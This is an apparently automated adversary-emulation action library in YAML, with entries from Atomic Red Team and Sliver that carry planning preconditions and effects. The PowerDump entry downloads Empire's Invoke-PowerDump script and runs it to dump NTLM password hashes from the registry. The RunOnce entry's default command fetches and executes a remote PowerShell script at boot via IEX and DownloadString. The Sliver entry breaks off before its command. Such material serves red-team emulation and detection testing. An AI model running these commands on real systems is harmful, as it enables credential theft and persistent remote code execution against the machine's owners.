  - uuid: art-t1003_002-powerdump
    name: PowerDump Hashes and Usernames from Registry
    id:
      - T1003.002
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - 'OS Credential Dumping: Security Account Manager'
    description: |
      Empire's `Invoke-PowerDump` reads SAM / SYSTEM registry directly and
      prints NTLM hashes to stdout in one shot — combined dumper + parser
      (Powershell Mimikatz pattern). Method 3 folds the ART prereq
      (download Invoke-PowerDump.ps1 from BC-SECURITY/Empire mirror). ART
      auto_generated_guid 804f28fc-68fc-40da-b5a2-e9d0bce5c193.
    execution:
      executor: Powershell Executor
      command: |
        $script = "#{powerdump_ps1}"
        if (-not (Test-Path $script)) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          New-Item -ItemType Directory (Split-Path $script) -Force | Out-Null
          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile $script
        }
        Import-Module $script
        Invoke-PowerDump
    arguments:
      executor:
        description: The Powershell session ID used to invoke PowerDump.
        required: true
        pddl_index: executor3_var_in_plan
      powerdump_ps1:
        default: C:\Users\Public\Invoke-PowerDump.ps1
        description: Target-side path where Invoke-PowerDump.ps1 is staged.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1547_001-powershell-runonce
    name: PowerShell Registry RunOnce
    id:
      - T1547.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
    description: |
      Sets `NextRun` under a Run/RunOnce registry path via PowerShell's
      `Set-ItemProperty`. Payload runs at next system boot. Demonstrates
      the PowerShell variant of the classic Run-key persistence pattern.
      ART auto_generated_guid eb44f842-0457-4ddc-9b92-c4caa144ac42.
    execution:
      executor: Powershell Executor
      command: |
        Set-ItemProperty "#{reg_key_path}" "NextRun" '#{command_to_execute}'
    arguments:
      executor:
        description: The Powershell session ID used to invoke Set-ItemProperty.
        required: true
        pddl_index: executor3_var_in_plan
      reg_key_path:
        default: HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
        description: Registry path for the RunOnce entry.
        required: true
      command_to_execute:
        default: powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload.ps1')
        description: Command line invoked at next system boot.
        required: true
        pddl_index: string2_var_in_plan
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (command-execution-at-startup ?c - string ?target - host)
  - uuid: sliver-cmd
    name: Execute Command (cmd.exe)
    id:
      - T1059.003
    source: Sliver
    supported_platforms:
      - windows
    tactics:
      - Execution
    technique:
      - |
        Command and Scripting Interpreter: Windows Command Shell
    description: The `cmd.exe` command executes a Windows command. It runs the specified
      command on the remote host and returns the result. This command is useful for
      performing various system tasks.
    execution:
      executor: Sliver Session Derive
      command: |
